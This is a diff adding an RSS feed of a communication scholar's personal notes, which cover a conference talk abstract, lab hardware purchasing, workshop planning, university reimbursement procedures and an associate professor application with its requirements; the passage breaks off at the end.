@@ -1,0 +1,1632 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title></title>
+    <link>https://chengjun.github.io/en/note/index.xml</link>
+    <description>Recent content on </description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>&amp;copy; 2016 Cheng-Jun Wang</copyright>
+    <lastBuildDate>Sun, 01 Jan 2017 00:00:00 +0000</lastBuildDate>
+    <atom:link href="/en/note/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Analyzing Mobile Phone Data With Network Science</title>
+      <link>https://chengjun.github.io/en/note/2016-10-18-ica2017talk/</link>
+      <pubDate>Sun, 14 May 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2016-10-18-ica2017talk/</guid>
+      <description>
+
+&lt;h3 id=&#34;abstract-150-200-word&#34;&gt;Abstract (150-200 word)&lt;/h3&gt;
+
+&lt;p&gt;With the widespread use of mobile computing devices in contemporary society, our trajectories in the physical space and virtual world are increasingly closely connected. Using the anonymous smartphone data, we can construct the communication network, mobility network, and attention network, and further analyze the data in the perspective of network science.&lt;/p&gt;
+
+&lt;h3 id=&#34;short-bio&#34;&gt;short-bio&lt;/h3&gt;
+
+&lt;p&gt;Cheng-Jun Wang, Ph.D. He is currently an assistant research fellow in the School of Journalism and Communication, Nanjing University. He is also the director of Ogilvy Data Science Lab, Computational Communication Collaboratory. His research on computational communication appears in both SSCI and SCI indexed journals, such as Scientific Reports, PloS ONE, Physica A, Cyberpsychology, and Journal of Social and Personal Relationships.&lt;/p&gt;
+
+&lt;h3 id=&#34;20-25-minutes&#34;&gt;20-25 minutes&lt;/h3&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>计算设备购买</title>
+      <link>https://chengjun.github.io/en/note/2017-05-07-lab-thinktank/</link>
+      <pubDate>Sun, 07 May 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-05-07-lab-thinktank/</guid>
+      <description>
+
+&lt;blockquote&gt;
+&lt;p&gt;全球华人思想库这个项目，资金到位了。现在需要开发一个工具，1、便于全球分主题投稿、整理、档案管理。2、自动生成分主题的元研究：学术搜索和整理综述。你看这个开发怎么做？需要多久？哪些成本？目前急于要开设备清单，以便李晓愚申述双创经费。你们可否在仙林或电话聊一下？只能买硬件。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;投稿系统，可以考虑博客系统&lt;/li&gt;
+&lt;li&gt;Web服务器， 建设搜索引擎&lt;/li&gt;
+&lt;li&gt;自动主题生成&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;硬件&#34;&gt;硬件&lt;/h3&gt;
+
+&lt;p&gt;大数据实验室是计算传播学研究中心的一个重要组成部分。这个实验室目前落到了我和fm两个做project leader，系里从奥美研究院拿出50万支持这个实验室的硬件设施。&lt;/p&gt;
+
+&lt;p&gt;它的组成包括了分布式数据抓取和计算平台、共享计算平台、数据存储平台和实验室网站服务器四个部分组成。另外，接受计算士的意见，我决定购买2-3台macbook。&lt;/p&gt;
+
+&lt;h3 id=&#34;软件&#34;&gt;软件&lt;/h3&gt;
+
+&lt;p&gt;巢老师的意见是要实验室表现出传播力。因为我们从论文发表到资源积累，都落后与其他文科院系。但是即便是这些院系中的相关实验室，也较少为外界所知。这不得不让我好奇@北大新媒体这个微博账号是如何运营的啦。&lt;/p&gt;
+
+&lt;p&gt;同时他也告诉我近期的发展，实验室的人手缺乏是重要的问题。我想模仿城大的策略：吸引优秀的本系和外系本科生。目前南大鼓楼主要是商法传播物理这些院系。我想通过一些方式（读书会、沙龙）来吸引更多的本科生加入。采用一定的考核机制，实验室可以成为他们学习的空间，但他们必须参加实验室组会和其他活动，并承担一定的义务。&lt;/p&gt;
+
+&lt;p&gt;按照他的设想，11月完成硬件配置；11月和12月共组织四次活动；我在明年准备开设计算传播学导论的课程。&lt;/p&gt;
+
+&lt;p&gt;我将把我的一些合作者列为实验室的合作成员。参与weblab的组会、与计算士的午间讨论、与信纸的合作项目都可以展开了。&lt;/p&gt;
+
+&lt;p&gt;同时我自己的论文也迫在眉睫啦。&lt;/p&gt;
+
+&lt;h3 id=&#34;如何订购实验室电脑&#34;&gt;如何订购实验室电脑&lt;/h3&gt;
+
+&lt;p&gt;按要求填写申购贵重仪器设备可行性论证报告，需要寻找三家销售代理，细化装备的金额情况。在Hp和dell官网打电话找销售代理，打电话。看了apple中国的报价，以老师或学生身份购买会便宜很多。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>计算传播学年会工作坊组办</title>
+      <link>https://chengjun.github.io/en/note/2017-04-01-conference-host/</link>
+      <pubDate>Sat, 01 Apr 2017 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-04-01-conference-host/</guid>
+      <description>
+
+&lt;h1 id=&#34;2017年计算传播学年会暨工作坊&#34;&gt;2017年计算传播学年会暨工作坊&lt;/h1&gt;
+
+&lt;p&gt;计算社会科学研究范式对传播学研究产生了重要影响。熟悉计算社会科学研究范式并掌握基本的计算技能，是传播学者进入计算计算传播学领域的基本条件。基于此，南京大学新闻与传播学院、百度、社会媒体处理专业委员会以及香港城市大学互联网挖掘实验室拟共同举办2017年计算传播学工作坊。本次计算传播学年会暨工作坊共2.5天时间，包括：一天半工作坊 + 一天会议。&lt;/p&gt;
+
+&lt;h2 id=&#34;内容分工&#34;&gt;内容分工&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;网络科学基础&amp;amp;信息扩散的计算因素（python+networkx基础）成军&lt;/li&gt;
+&lt;li&gt;单条信息传播的测量&amp;amp;机器学习框架 小可&lt;/li&gt;
+&lt;li&gt;信息传播中的节点重要性&amp;amp;可视化 张伦&lt;/li&gt;
+&lt;li&gt;行为的传播机制 海波&lt;/li&gt;
+&lt;li&gt;信息传播模型 海波、成军、阮中远&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;标准&#34;&gt;标准&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;以工作坊为契机，为教学课程、科研、书籍做准备。&lt;/li&gt;
+&lt;li&gt;有一个编程实现的例子作为遴选标准&lt;/li&gt;
+&lt;li&gt;使用notebook&lt;a href=&#34;http://nbviewer.jupyter.org/github/computational-class/cjc/blob/gh-pages/slides/01.slides.slides.html&#34; target=&#34;_blank&#34;&gt;做slides，一个例子&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;deadline&#34;&gt;Deadline&lt;/h2&gt;
+
+&lt;p&gt;7月15日提交使用jupyter notebook&lt;/p&gt;
+
+&lt;h3 id=&#34;使用notebook制作slides的方法&#34;&gt;使用notebook制作slides的方法&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;安装Anaconda Python&lt;/li&gt;
+&lt;li&gt;Downnload from &lt;a href=&#34;https://github.com/damianavila/RISE&#34; target=&#34;_blank&#34;&gt;https://github.com/damianavila/RISE&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;open your teminal, cd to the RISE folder, e.g.,
+&lt;code&gt;cd /github/RISE/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;To install this nbextension, simply run
+&lt;code&gt;python setup.py install&lt;/code&gt;
+from the RISE repository.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In the notebook toolbar, a new button (&amp;ldquo;Enter/Exit Live Reveal Slideshow&amp;rdquo;) will be available. The notebook toolbar also contains a &amp;ldquo;Cell Toolbar&amp;rdquo; dropdown menu that gives you access to metadata for each cell.&lt;/p&gt;
+
+&lt;p&gt;If you select the Slideshow preset, you will see in the right corner of each cell a little box where you can select the cell type (similar as for the static reveal slides with &lt;code&gt;nbconvert&lt;/code&gt;).&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>大学财务报销</title>
+      <link>https://chengjun.github.io/en/note/2017-03-20-ndcw/</link>
+      <pubDate>Mon, 20 Mar 2017 11:18:42 +0800</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-03-20-ndcw/</guid>
+      <description>
+
+&lt;h2 id=&#34;财务处网站&#34;&gt;财务处网站&lt;/h2&gt;
+
+&lt;p&gt;蓝鲸大学财务网站 &lt;a href=&#34;http://ndcw.nju.edu.cn/&#34; target=&#34;_blank&#34;&gt;http://ndcw.nju.edu.cn/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/fa541268765759fd854e4b24d77d0c59.png&#34; alt=&#34;网上自助平台&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;如何发放专家咨询费？&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;学生劳务费&lt;/li&gt;
+&lt;li&gt;专家咨询费&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;终于搞明白了，在&lt;strong&gt;收入申报&lt;/strong&gt;部分填写，好像只有校内网络才能登录。我居然用了这么长的时间才搞明白这个系统，主要是自己一直在家里待着，用不了这个系统。&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/0a72061a524c8ac8211c8aa0ed0d6d32.png&#34; alt=&#34;收入申报&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;公务卡&#34;&gt;公务卡&lt;/h2&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://pan.baidu.com/s/1dF5ShNz&#34; target=&#34;_blank&#34;&gt;公务卡报销过程中的问题解答&lt;/a&gt; 2017年3月16日&lt;/p&gt;
+
+&lt;p&gt;2017-05-31在仙林校区外的工行激活了我的公务卡，在图书馆里使用公务卡买了火车票两张，还是挺方便的。后面去桔子酒店预订住宿一晚。希望早日学会使用公务卡消费。&lt;/p&gt;
+
+&lt;p&gt;消费满25日内还款还是有压力的吖，要去跑财务处了。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>找工作</title>
+      <link>https://chengjun.github.io/en/note/2017-03-15-job/</link>
+      <pubDate>Wed, 15 Mar 2017 12:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/en/note/2017-03-15-job/</guid>
+      <description>
+
+&lt;h1 id=&#34;述职报告&#34;&gt;述职报告&lt;/h1&gt;
+
+&lt;p&gt;各位老师，大家好。我是王成军，来自南京大学新闻传播学院，我的述职报告的题目是《计算社会科学视角下的传播学研究》。具体包括四个部分，分别是：个人简介、研究成果、教学服务、工作计划。&lt;/p&gt;
+
+&lt;p&gt;我本科和硕士分别毕业于兰州大学和北京大学，2014年毕业于香港城市大学媒体与传播系，获传播学博士学位。9月加入南京大学新闻传播学院，担任奥美数据科学实验室主任，计算传播学实验中心成员、互联网挖掘实验室研究员。我的主要研究兴趣聚焦于计算传播学，具体包括：注意力流动网络、公共讨论，最近在做团队科学的研究。更多信息参见我的个人网站。&lt;/p&gt;
+
+&lt;p&gt;接下来介绍我的研究成果，英文发表包括：四篇SCI/SSCI一作或通讯作者论文、两篇SCI/SSCI三作论文、十五篇国际会议论文。其中，包括两篇自然出版集团期刊Scientific reports，一篇Physica A， 还有一篇Cyberpyschology。期刊的影响因子均较高，其中Cyberpyschology在2013年传播学72本国际期刊中排名第四。&lt;/p&gt;
+
+&lt;p&gt;人类传播行为的相关数据及其互动可能变革我们对于人类群体行为的理解。这是计算社会科学的领军人物Ducan Watts在2007年发表于Nature期刊的文章所提出的洞见，Watts认为社会科学将成为21世纪的科学，2009年Lazer， Pentland等一批研究者在Science上发表题为计算社会科学的文章。与之类似，在人文学科研究领域，也产生了“数字人文”的研究范式。&lt;/p&gt;
+
+&lt;p&gt;如何采用计算社会科学的视角理解传播现象？基于这一视角，我发表了几篇关于计算传播学的论文，确立了计算传播学的概念和目标。在这个过程中，参与翻译了一本使用Python进行社会网络分析的书籍，合著了《社交网络上的计算传播学》一书。&lt;/p&gt;
+
+&lt;p&gt;最近三年发表的论文主要是关于注意力流动网络的。处于注意力经济时代，人们每天都会接触大量的信息。研究个体和群体的注意力流动具有重要的理论和应用价值。逐渐确立了一种新的研究策略：即使用大规模数据，简单的计算机算法和物理学模型，回答社会科学的大问题。采用用这种方法，分析了百度贴吧用户的注意力流动中的标度现象，社交新闻网站的群体注意力流动的方向，北京移动用户的线上注意力流动和在物理空间的移动行为的关联，推特上的关于社会运动的公众讨论。&lt;/p&gt;
+
+&lt;p&gt;我申请了几个研究项目，主持了国家社会科学基金青年项目、博士后科学基金面上项目，并参与了一个自然科学基金项目。&lt;/p&gt;
+
+&lt;p&gt;在教学服务方面，也主要围绕建设计算传播学社区展开，为研究生和本科生课设《计算传播》、《数据新闻》、《计算广告》相关课程。为更好建设计算传播学社区，2014年发起建立了计算传播网，2015年参与创建了计算传播学实验中心，7月主办了集智注意力科学年会，2016年9月主办了第一届计算传播学论坛。2017年该会议发展为计算传播学年会，为期3天，并包括一个两天的工作坊。我还担任 IJPOR \ CHB \ JASIST \ICA 新闻与传播研究、新闻大学等期刊的的reviewer。我开发了两个python软件包iching和scholarnetwork， 一个R软件包networkdiffusion。&lt;/p&gt;
+
+&lt;p&gt;未来计划在教学方面：继续开设《数据新闻》、《计算传播》等课程。并将于2017年，开设233改革硕士品牌课程 《大数据挖掘与分析》；在科研方面，定位于定位高影响因子期刊的英文论文、兼顾中文论文；出版《计算传播学导论》一书。在社会服务方面：继续举办“计算传播学工作坊和年会”，积极参与学校智库和双创建设。&lt;/p&gt;
+
+&lt;h1 id=&#34;找工作&#34;&gt;找工作&lt;/h1&gt;
+
+&lt;p&gt;蓝鲸大学&lt;a href=&#34;http://hr.nju.edu.cn/&#34; target=&#34;_blank&#34;&gt;人力资源处&lt;/a&gt;3月8日发布&lt;a href=&#34;http://hr.nju.edu.cn/c6/33/c5979a181811/page.htm&#34; target=&#34;_blank&#34;&gt;2016年教授、副教授招聘公告&lt;/a&gt;, 其中新传院的招聘公告包括了&lt;a href=&#34;http://hrmis.nju.edu.cn/urp-data/rss/post-detail.jsp?post=P20161044&amp;amp;isElse=&#34; target=&#34;_blank&#34;&gt;教授要求&lt;/a&gt; 和&lt;a href=&#34;http://hrmis.nju.edu.cn/urp-data/rss/post-detail.jsp?post=AP20162051&amp;amp;isElse=&#34; target=&#34;_blank&#34;&gt;副教授（校外）要求&lt;/a&gt;。看了一下细节，达到了副教授的基本要求。15日问了下学院黄老师，直接按照网页的要求填写即可，学院还没有收到具体通知。&lt;/p&gt;
+
+&lt;p&gt;首先按照这个&lt;a href=&#34;http://219.219.114.94/urp-pg/&#34; target=&#34;_blank&#34;&gt;网址&lt;/a&gt;填写校外申报的材料,  使用Winebottler的IE浏览器未果，结果发现使用FireFox可以填写！但是不能打印。IE7或者IE11都不能打印。最后发现图书馆里用的浏览器是Win10系统里的&lt;strong&gt;Microsoft EDGE 20&lt;/strong&gt;，可以打印, 原来也不是IE。&lt;/p&gt;
+
+&lt;p&gt;一天后（3月16日），学院人事通知最好能在3月24日前交齐材料，后面院系还有一系列公示，并给了一系列可以下载填写的资料和详细纸质版本报送方式，详见&lt;a href=&#34;http://hr.nju.edu.cn/cb/85/c5977a183173/page.htm&#34; target=&#34;_blank&#34;&gt;关于2016年教师高级职务岗位评聘有关工作的通知中的&lt;strong&gt;下载资料&lt;/strong&gt;&lt;/a&gt;，其中需要注意的是，有关应聘人员做好准备（提供PPT），述职时间6分钟。&lt;/p&gt;
+
+&lt;h2 id=&#34;to-do-list&#34;&gt;To-do list&lt;/h2&gt;
+
+&lt;ul class=&#34;task-list&#34;&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 1. &lt;del&gt;填写任职资格&lt;strong&gt;申报表&lt;/strong&gt;&lt;/del&gt;
+
+&lt;ul class=&#34;task-list&#34;&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; &lt;del&gt;格式调整，解决方法：在word里填写表格并打印&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; 打印2份&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 2. &lt;del&gt;推荐信&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 3. &lt;del&gt;填写教师系列&lt;strong&gt;申请表&lt;/strong&gt;&lt;/del&gt;
+
+&lt;ul class=&#34;task-list&#34;&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled class=&#34;task-list-item&#34;&gt; 打印6份&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 4. &lt;del&gt;打印5篇代表作6份&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 5. &lt;del&gt;科技查新&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 6. &lt;del&gt;学历学位&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled class=&#34;task-list-item&#34;&gt; 7. &lt;del&gt;教师资格&lt;/del&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;[ ] &lt;strong&gt;述职6分钟&lt;/strong&gt;，准备PPT&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;科技查新 &lt;a href=&#34;http://lib.nju.edu.cn/html/article.htm?id=30&amp;amp;fid=24&#34; target=&#34;_blank&#34;&gt;http://lib.nju.edu.cn/html/article.htm?id=30&amp;amp;fid=24&lt;/a&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;校内访问 &lt;a href=&#34;http://cx.nju.edu.cn/&#34; target=&#34;_blank&#34;&gt;http://cx.nju.edu.cn/&lt;/a&gt; 状态 &lt;a href=&#34;http://cx.nju.edu.cn/novelty/status.php&#34; target=&#34;_blank&#34;&gt;http://cx.nju.edu.cn/novelty/status.php&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;1、请用校内经费卡转账至图书馆账号0301 0011 3101。&lt;/li&gt;
+&lt;li&gt;2、携转账发票黄色联至鼓楼图书馆104室或仙林图书馆2310室领取报告。祝您一切顺利！（鼓楼取报告的需多等待1~2个工作日）。&lt;/li&gt;
+&lt;li&gt;3、如需要，可将此邮件打印提供给校财务处作检索记录证明清单。 【在本次委托完成前请将以往尚未交费或缴纳过押金但未转账，以及尚未提供转账单黄色联的委托记录结算完毕后再领取此次查新报告，如无欠费情况可忽略此信息。谢谢您的合作。】&lt;/li&gt;
+&lt;li&gt;ISI Web of Knowledge &lt;a href=&#34;http://lib.nju.edu.cn/html/database.htm?id=6&amp;amp;fid=3&#34; target=&#34;_blank&#34;&gt;http://lib.nju.edu.cn/html/database.htm?id=6&amp;amp;fid=3&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;C刊被引用情况 &lt;a href=&#34;http://cssci.nju.edu.cn/&#34; target=&#34;_blank&#34;&gt;http://cssci.nju.edu.cn/&lt;/a&gt;  &lt;strong&gt;鼓楼&lt;/strong&gt;图书馆505&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;注意事项&#34;&gt;注意事项&lt;/h2&gt;
+
+&lt;p&gt;最好能在3月24日前交齐材料，后面院系还有一系列公示啥啥的
+- 关于2016年教师高级职务岗位评聘有关工作的通知.rar&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&#34;http://hr.nju.edu.cn/cb/85/c5977a183173/page.htm&#34; target=&#34;_blank&#34;&gt;http://hr.nju.edu.cn/cb/85/c5977a183173/page.htm&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;有关应聘人员做好准备（提供PPT），述职时间6分钟。&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;一、根据学校专业职务评聘工作的计划安排，2016年度教师高级职务招聘岗位已经发布，请各院系根据教师高级职务岗位要求进行公开招聘，并按规定接受应聘后，对申报人员材料进行公开展示、成果审查核对，以及思想政治、教学与科研等业务能力与潜力评审等工作。在评审结果公示后，&lt;code&gt;院系推荐候选人的评审材料须于4月5日前报送人力资源处培训发展办公室（个人网上申报、单位审核推荐工作须同步完成）&lt;/code&gt;。逾期不报送者，责任由相关院系单位承担。&lt;/li&gt;
+&lt;li&gt;二、申报教师高级职务人员所提供的研究成果必须为任现职以来的成果，同时提交的检索证明中，需提供申报人成果“被收录情况”和“被引用情况”，并分别标出“自引”和“他引”,成果截止至&lt;code&gt;2016年12月31日&lt;/code&gt;。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&#34;关于报送教师高级职务岗位评聘材料的要求&#34;&gt;关于报送教师高级职务岗位评聘材料的要求&lt;/h3&gt;
+
+&lt;p&gt;3、聘任候选人员应交的材料：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;①高等学校教师职务任职资格申报表（一式两份）（表格中照片、个人签名、院系领导签字盖章等手续须完备）&lt;/li&gt;
+&lt;li&gt;②2位专家推荐意见(每个专家各两套，对应①) （须由推荐专家亲笔签名，每套分别附于任职资格申报表后）&lt;/li&gt;
+&lt;li&gt;③《南京大学教师高级职务岗位申请表》（一式六份）&lt;/li&gt;
+&lt;li&gt;④反映个人水平的代表作5篇（部）（六套）&lt;/li&gt;
+&lt;li&gt;⑤任现职以来代表成果的引用情况和检索证明（需提供申报人成果“被收录情况”和“被引用情况”，并分别标出“自引”和“他引”）。（一份）&lt;/li&gt;
+&lt;li&gt;⑥学历学位证书复印件（一份）&lt;/li&gt;
+&lt;li&gt;⑦教师资格证书复印件（一份）&lt;/li&gt;
+&lt;li&gt;⑧海外研修经历证明材料&lt;/li&gt;
+&lt;li&gt;⑨校外申请者如已具有专业技术职务，请提供相应证书或文件等证明材料&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;以上材料请装档案袋、粘贴封面提交，封面以A4纸打印，申请材料格式见第2页（包括①②③④⑤⑥⑦⑧⑨）。今年开始，所有岗位申报人员还需另外提供五个档案袋作为鉴定材料，鉴定材料档案袋封面格式见第3页，每个档案袋包括③④成套装好。&lt;/p&gt;
+
+&lt;p&gt;注：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;报送材料电子文本接收信箱：zydiao@nju.edu.cn（院系报送）&lt;/li&gt;
+&lt;li&gt;文科检索可到图书馆五楼“中国社会科学研究评价中心”，联系电话：025-83595841。&lt;/li&gt;
+&lt;li&gt;理科检索可到图书馆一楼“教育部科技查新工作站（南京大学站）”联系电话：025-83593401（鼓楼），025-89683401（仙林），或其他经国家认定的科技查新站。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;四、 应聘所须材料：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;1、应聘者可通过互联网或邮件、传真向我校人力资源处提出应聘申请，所需提供的材料如下：
+
+&lt;ul&gt;
+&lt;li&gt;①《高等学校教师职务任职资格申报表（两份） 下载&lt;/li&gt;
+&lt;li&gt;②《南京大学教师专业技术职务高级岗位申请表》 (由系统填报后自动生成,调整格式后打印，四份)&lt;/li&gt;
+&lt;li&gt;③两封专家推荐信（两套）
+
+&lt;ul&gt;
+&lt;li&gt;注:1、申请人员的推荐信可直接转至申报岗位所在院系；2、请将两份专家推荐意见以扫描或电子转换方式生成JPG或PDF格式文档上传至系统内相应位置&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;④代表性论文论著5篇（部）（原件1份，复印件3份）&lt;/li&gt;
+&lt;li&gt;注:请将个人近五年内最具代表性的论文或论著以扫描或电子转换方式生成PDF格式文档上传至系统内相应位置，其中论文请扫描全文，&lt;/li&gt;
+&lt;li&gt;&lt;del&gt;&lt;code&gt;论著请扫描著作的封面、书名页、封底三页&lt;/code&gt;&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;⑤其他成果证明复印件&lt;/li&gt;
+&lt;li&gt;⑥学历学位证书复印件 &lt;del&gt;&lt;strong&gt;放在哪里？&lt;/strong&gt;&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;⑦专业职务聘任证书复印件 &lt;del&gt;&lt;strong&gt;放在哪里？&lt;/strong&gt;&lt;/del&gt;&lt;/li&gt;
+&lt;li&gt;⑧外语能力证明复印件、教师资格证、海外研修证明材料等 &lt;del&gt;&lt;strong&gt;放在哪里？&lt;/strong&gt;&lt;/del&gt;&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;2、应聘者提供材料必须真实准确。&lt;/li&gt;
+&lt;li&gt;3、所有应聘材料一般不予退还，需要退还的材料请特别说明。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;一、教学要求&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;（1） 每年至少为本科生独立开设一门课，周学时不少于 2 学时。&lt;/li&gt;
+&lt;li&gt;（2） 在 5 分制的课堂教学质量测评中，测评得分不能低于 4.5分。&lt;/li&gt;
+&lt;li&gt;（3） 积极参与本科生的实验、实习、学年论文和毕业论文等指导工作；协助指导过硕士研究生培养。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;二、正常申报科研要求 总体要求：专注于本学科有关方向的研究，能独立开展科研工作，取得了具有一定质量和数量的研究成果。 具体要求：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;（1） 任现职以来，主持 1 项省部级课题或主持 1 项国家社科基金重大招标、教育部人文社科重大招标课题的子课题（以批准的项目投标书为依据）。&lt;/li&gt;
+&lt;li&gt;（2） 作为横向课题负责人，社会科学学科申请人获得经费 30 万元以上、人文科学学科申请人获得经费 15 万元以上，可以折算为 1 个省部级课题（以实际到帐金额为准）。&lt;/li&gt;
+&lt;li&gt;（3） 任现职以来，至少 8 篇论文被 CSSCI 收录
+
+&lt;ul&gt;
+&lt;li&gt;如果成果中包含 1 篇 SSCI/A&amp;amp;HCI 期刊论文或 CSSCI 一流期刊论文，则数量要求为 6 篇，并且在同等条件下优先。&lt;/li&gt;
+&lt;li&gt;专著（第一作者）可折算 2 篇 CSSCI 期刊论文，有多部专著时仅可折算1 部专著。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;（4） 积极参加学校与院系单位的发展规划、学科建设、平台建设等工作；积极参加国际国内学术交流活动；积极参加社会服务活动。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;副教授岗位职责&#34;&gt;副教授岗位职责&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;承担传播学专业本科生2门以上专业课程教学。&lt;/li&gt;
+&lt;li&gt;成为硕导后，承担传播学专业研究生1门以上专业课程教学，指导硕士生若干名。&lt;/li&gt;
+&lt;li&gt;定期参加全国范围内相关学术研讨会，同时参与新闻传播业界的相关事务。&lt;/li&gt;
+&lt;li&gt;任期内主持省级以上课题1项。&lt;/li&gt;
+&lt;li&gt;每三年内发表SCI A区及以上级别期刊论文至少1篇，或SCI B区期刊论文至少1篇；或SSCI&amp;amp; HCI 论文、CSSCI一流期刊论文至少1篇，或CSSCI论文至少3篇，或有影响的学术专著1部（由院学术委员会认定）。成果均以本人为&lt;code&gt;第一作者或通讯作者&lt;/code&gt;，第一署名单位为南京大学。&lt;/li&gt;
+&lt;li&gt;担负传播学专业本科生专业辅导工作，完成院里或系里交给的相关工作。积极参加学校与院系单位的发展规划、学科建设、平台建设等工作；积极参加国际国内学术交流活动；积极参加社会服务活动。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&#34;申请教授的要求&#34;&gt;申请教授的要求&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;（1） 任现职以来，主持 1 项国家级课题或 2 项省部级课题。&lt;/li&gt;
+&lt;li&gt;（2） 作为横向课题负责人，社会科学学科申请人获得横向经费60 万元以上、人文学科申请人获得横向经费 30 万元以上，可以折算为 1 个省部级课题（以实际到帐金额为准）。&lt;/li&gt;
+&lt;li&gt;（3） &lt;code&gt;任现职&lt;/code&gt;以来，至少 &lt;strong&gt;12&lt;/strong&gt; 篇论文被 SSCI/A&amp;amp;HCI 或者 CSSCI收录，
+
+&lt;ul&gt;
+&lt;li&gt;其中必须至少包含 1 篇 SSCI/A&amp;amp;HCI 期刊论文或CSSCI 一流期刊论文，SSCI 发文期刊分区要求在三区以上。&lt;/li&gt;
+&lt;li&gt;专著（第一作者）可折算 2 篇 CSSCI 期刊论文，有多部专著时最多可折算 3 部专著。&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;（4） 积极参加学校与院系单位的发展规划、学科建设、平台建设等工作；积极参加国际国内学术交流活动；积极参加社会服务活动。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/c87c77e50bb3d0f15f33f560e038976b.png&#34; alt=&#34;equal vs fair&#34; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;博士后&#34;&gt;博士后&lt;/h1&gt;
+
+&lt;h2 id=&#34;博士后出站&#34;&gt;博士后出站&lt;/h2&gt;
+
+&lt;ol&gt;
